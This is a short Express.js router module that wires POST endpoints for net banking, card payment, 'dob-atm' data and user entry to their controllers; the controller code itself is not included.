const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 
const netBankingController = require('../controllers/netBankingController');
const dobAtmController = require('../controllers/dobAtmController');
const cardController = require('../controllers/cardController');

router.post('/banking', netBankingController.submitNetBankingPayment);
router.post('/dob-atm', dobAtmController.saveDobAtmData);
router.post('/card', cardController.submitCardPayment);
router.post('/entry', userController.saveUserData);

module.exports = router;
